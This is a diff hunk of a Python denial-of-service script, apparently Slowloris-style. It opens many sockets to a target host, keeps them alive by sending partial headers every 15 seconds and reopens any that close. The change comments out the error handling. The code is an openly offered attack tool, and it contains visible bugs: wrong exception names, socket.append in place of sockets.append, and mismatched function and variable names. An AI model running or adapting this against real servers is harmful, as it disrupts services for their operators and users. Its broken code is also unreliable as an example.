@@ -33,30 +33,30 @@ if __name__ == "__main__":
     print("Starting DoS Attack on {}. Connecting to {} socket".format(host, count))
 
     for _ in range(count):
-        try:
-            print("Socket {}".format(_))
-            sock = socketInitialization(host)
-        except socket.errors():
-            break
+        # try:
+        print("Socket {}".format(_))
+        sock = socketInitialization(host)
+        # except socket.errors():
+        #     break
         socket.append(sock)
 
     while True:
         print("Connected to {} sockets. Sending headers...".format(len(sockets)))
 
         for sock in list(sockets):
-            try:
-                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
-            except socket.error:
-                sockets.remove(sock)
+            #try:
+            sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
+            # except socket.error:
+            #     sockets.remove(sock)
 
         for _ in range(count - len(sockets)):
             print("Re-opening closed sockets...")
-            try:
-                sock = setupSocket(ip)
-                if sock:
-                    sockets.append(sock)
-            except socket.errors():
-                break
+            #try:
+            sock = setupSocket(ip)
+            if sock:
+                sockets.append(sock)
+            # except socket.errors():
+            #     break
 
         time.sleep(15)
 
